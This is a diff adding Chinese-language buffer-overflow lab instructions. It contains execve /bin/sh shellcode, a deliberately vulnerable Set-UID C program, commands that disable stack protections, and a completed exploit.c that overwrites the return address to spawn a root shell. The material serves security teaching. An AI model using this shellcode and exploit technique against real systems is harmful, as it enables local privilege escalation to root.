@@ -51,6 +51,161 @@ $ sudo ln -s /bin/zsh /bin/sh
 ```
 
 ### 任务一 运行shell代码
+在开始攻击之前，让我们熟悉一下shellcode。Shellcode是启动Shell的代码，必须将其加载到**内存**中，以便我们可以迫使易受攻击的程序跳转至该内存。考虑以下程序：
+```c
+#include<stdio.h>
+
+int main()
+{
+    char* name[2];
+    name[0]= "/bin/sh";
+    name[1]=NULL;
+    execve(name[0],name,NULL);
+}
+```
+我们使用的shellcode只是上述程序的汇编版本。以下程序显示了如何通过执行存储在缓冲区中的shellcode来启动shell。请编译并运行以下代码，并查看是否调用了shell。您可以从网站下载程序。
+```c
+/* call_shellcode.c  */
+
+/*A program that creates a file containing code for launching shell*/
+#include <stdlib.h>
+#include <stdio.h>
+
+const char code[] =
+  "\x31\xc0"             /* xorl    %eax,%eax              */
+  "\x50"                 /* pushl   %eax                   */
+  "\x68""//sh"           /* pushl   $0x68732f2f            */
+  "\x68""/bin"           /* pushl   $0x6e69622f            */
+  "\x89\xe3"             /* movl    %esp,%ebx              */
+  "\x50"                 /* pushl   %eax                   */
+  "\x53"                 /* pushl   %ebx                   */
+  "\x89\xe1"             /* movl    %esp,%ecx              */
+  "\x99"                 /* cdq                            */
+  "\xb0\x0b"             /* movb    $0x0b,%al              */
+  "\xcd\x80"             /* int     $0x80                  */
+;
+
+int main(int argc, char **argv)
+{
+   char buf[sizeof(code)];
+   strcpy(buf, code);
+   ((void(*)( ))buf)( );
+} 
+```
+使用以下`gcc`命令编译以上代码。运行程序并描述您的观察结果。请不要忘记使用`execstack`选项，该选项允许从堆栈执行代码。没有此选项，程序将失败。
+
+```shell
+$ gcc -z execstack -o call_shellcode call_shellcode.c
+```
+上面的shellcode调用execve()系统调用来执行/bin/sh。此shellcode中的一些地方值得一提。
+
+**首先**，第三条指令将“//sh”而不是“/sh”压入堆栈。这是因为我们在这里需要一个32位数字，而“/sh”只有24位。幸运的是，“//”等效于“/”，因此我们可以避免使用双斜杠符号。
+
+**其次**，在调用execve()系统调用之前，我们需要将name[0]（字符串的地址），name（数组的地址）和NULL分别存储到％ebx，％ecx和％edx寄存器中。第5行将name [0]存储到％ebx；第8行将名称存储到％ecx；第9行将％edx设置为零。还有其他方法可以将％edx设置为零(例如xorl％edx，％edx)； 这里使用的那个(cdq)只是一条较短的指令：它将EAX寄存器中的值的符号（第31位）（此时为0）复制到EDX寄存器的每个位位置，基本上将％edx设置为 0.
+
+**第三**，当我们将％al设置为11并执行“ int $ 0x80”时，系统调用execve()被调用。
+
+### 易受攻击的程序
+将为您提供以下程序，该程序在Line➀中具有缓冲区溢出漏洞。您的工作是利用此漏洞并获得root特权。
+```c
+/* stack.c */
+
+/* This program has a buffer overflow vulnerability. */
+/* Our task is to exploit this vulnerability */
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+int bof(char *str)
+{
+    char buffer[24];
+
+    /* The following statement has a buffer overflow problem */ 
+    strcpy(buffer, str);
+
+    return 1;
+}
+
+int main(int argc, char **argv)
+{
+    char str[517];
+    FILE *badfile;
+
+    badfile = fopen("badfile", "r");
+    fread(str, sizeof(char), 517, badfile);
+    bof(str);
+
+    printf("Returned Properly\n");
+    return 1;
+}
+```
+
+编译上述易受攻击的程序。不要忘记包括`-fno-stack-protector`和“`-z execstack`”选项，以关闭StackGuard和不可执行的堆栈保护。编译之后，我们需要使该程序成为root拥有的Set-UID程序。我们可以通过首先将程序的所有权更改为`root`（第Line行），然后将权限更改为`4755`以启用Set-UID位（第Line）来实现此目的。
+
+应当注意，更改所有权必须在开启Set-UID位之前完成，因为所有权更改将导致Set-UID位被关闭。
+
+```shell
+$ gcc -o stack -z execstack -fno-stack-protector stack.c
+$ sudo chown root stack ①
+$ sudo chmod 4755 stack ②
+```
+上面的程序有一个缓冲区溢出漏洞。它首先从名为`badfile`的文件中读取输入，然后将该输入传递到函数`bof()`中的另一个缓冲区。原始输入的最大长度可以为`517个字节`，但是`bof()`中的缓冲区只有`24个字节`长。由于`strcpy()`不检查边界，因此会发生缓冲区溢出。由于此程序是`Set-root-UID`程序，因此，如果普通用户可以利用此缓冲区溢出漏洞，则普通用户可能能够获得root shell。应当注意，程序从名为`badfile`的文件获取其输入。该文件受用户控制。现在，我们的目标是为`badfile`创建内容，以便当易受攻击的程序将内容复制到其缓冲区中时，可以生成`根shell`。
+
+### 任务二 利用漏洞
+我们为您提供了部分完成的利用代码，称为`“exploit.c”`。该代码的目的是为badfile构造内容。在此代码中，`shellcode`提供给您。您需要开发其余部分。
+
+```c
+/* exploit.c  */
+
+/* A program that creates a file containing code for launching shell*/
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+char shellcode[]=
+    "\x31\xc0"             /* xorl    %eax,%eax              */
+    "\x50"                 /* pushl   %eax                   */
+    "\x68""//sh"           /* pushl   $0x68732f2f            */
+    "\x68""/bin"           /* pushl   $0x6e69622f            */
+    "\x89\xe3"             /* movl    %esp,%ebx              */
+    "\x50"                 /* pushl   %eax                   */
+    "\x53"                 /* pushl   %ebx                   */
+    "\x89\xe1"             /* movl    %esp,%ecx              */
+    "\x99"                 /* cdq                            */
+    "\xb0\x0b"             /* movb    $0x0b,%al              */
+    "\xcd\x80"             /* int     $0x80                  */
+;
+
+void main(int argc, char **argv)
+{
+    char buffer[517];
+    FILE *badfile;
+
+    /* Initialize buffer with 0x90 (NOP instruction) */
+    memset(&buffer, 0x90, 517);
+
+    /* You need to fill the buffer with appropriate contents here */ 
+    strcpy(buffer+100,shellcode);			//将shellcode拷贝至buffer
+    strcpy(buffer+0x24,"\xbb\xf1\xff\xbf");		//在buffer特定偏移处起始的四个字节覆盖sellcode地址
+    /* Save the contents to the file "badfile" */
+    badfile = fopen("./badfile", "w");
+    fwrite(buffer, 517, 1, badfile);
+    fclose(badfile);
+}
+```
+
+完成上述程序后，编译并运行它。这将生成`badfile`的内容。然后运行易受攻击的程序`stack.c`。如果您的漏洞利用程序正确实施，则应该能够获得`root shell`： 
+
+**重要提示**：请首先编译您的易受攻击的程序。请注意，生成`badfile`的程序`exploit.c`可以在启用默认StackGuard保护的情况下进行编译。这是因为我们不会在该程序中溢出缓冲区。我们将溢出`stack.c`中的缓冲区，该缓冲区是在禁用StackGuard保护的情况下编译的。
+
+```shell
+$ gcc -o exploit exploit.c
+$./exploit // create the badfile
+$./stack // launch the attack by running the vulnerable program
+# <---- Bingo! You’ve got a root shell!
+```
+
+
+
 
 
 
